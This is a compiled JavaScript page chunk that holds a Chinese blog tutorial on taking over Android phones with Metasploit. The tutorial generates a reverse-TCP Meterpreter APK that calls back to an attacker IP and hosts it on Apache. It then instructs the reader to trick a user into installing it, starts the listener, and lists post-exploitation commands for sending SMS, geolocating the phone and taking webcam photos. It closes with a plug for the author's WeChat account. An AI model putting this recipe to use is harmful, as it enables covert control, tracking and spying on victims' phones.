(window.webpackJsonp=window.webpackJsonp||[]).push([[168],{458:function(a,s,t){"use strict";t.r(s);var e=t(7),r=Object(e.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"使用metasploit渗透android系统"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#使用metasploit渗透android系统"}},[a._v("#")]),a._v(" 使用Metasploit渗透Android系统")]),a._v(" "),s("p",[a._v("可以创建一个新的APK文件，也可以将攻击载荷注入到一个现有的APK文件来攻击Android平台，这里我们使用第一种方法。")]),a._v(" "),s("h2",{attrs:{id:"创建apk文件"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#创建apk文件"}},[a._v("#")]),a._v(" 创建APK文件")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" android/meterpreter/reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".175.128 "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("4444")]),a._v(" R "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" /var/www/html/test.apk\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"启动apache服务"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#启动apache服务"}},[a._v("#")]),a._v(" 启动Apache服务")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("service")]),a._v(" apache2 start\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"诱导用户下载安装apk"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#诱导用户下载安装apk"}},[a._v("#")]),a._v(" 诱导用户下载安装APK")]),a._v(" "),s("p",[a._v("这一步，我们诱导用户下载并安装这个APK文件。")]),a._v(" "),s("h2",{attrs:{id:"实施攻击"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#实施攻击"}},[a._v("#")]),a._v(" 实施攻击")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("msfconsole\nuse exploit/multi/handler\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("set")]),a._v(" payload android/meterpreter/reverse_tcp\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("set")]),a._v(" LHOST "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".175.128\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("set")]),a._v(" LPORT "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("4444")]),a._v("\nexploit\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br")])]),s("p",[a._v("到此，只要用户下载安装了我们的test.apk文件，我们就会获取到Meterpreter权限。")]),a._v(" "),s("h2",{attrs:{id:"后渗透测试"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#后渗透测试"}},[a._v("#")]),a._v(" 后渗透测试")]),a._v(" "),s("p",[a._v("在我们获取了目标Android手机的Meterpreter权限之后，我们可以执行如下命令进行后渗透攻击")]),a._v(" "),s("p",[s("strong",[a._v("注意：如下命令都是在meterpreter命令行下执行的。")])]),a._v(" "),s("h2",{attrs:{id:"查看手机是否root过"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#查看手机是否root过"}},[a._v("#")]),a._v(" 查看手机是否root过")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("check_root\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"发送短信"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#发送短信"}},[a._v("#")]),a._v(" 发送短信")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("send_sms "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-d")]),a._v(" 某个手机号码 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-t")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"hello"')]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"查看系统信息"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#查看系统信息"}},[a._v("#")]),a._v(" 查看系统信息")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sysinfo\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"对手机进行定位"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#对手机进行定位"}},[a._v("#")]),a._v(" 对手机进行定位")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("wlan_geolocate\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("此命令会输出手机的经纬度，我们根据这个经纬度就可以知道手机的具体位置。")]),a._v(" "),s("h2",{attrs:{id:"使用手机摄像头拍照"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#使用手机摄像头拍照"}},[a._v("#")]),a._v(" 使用手机摄像头拍照")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("webcam_snap\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"写在最后"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[a._v("#")]),a._v(" 写在最后")]),a._v(" "),s("blockquote",[s("p",[a._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);s.default=r.exports}}]);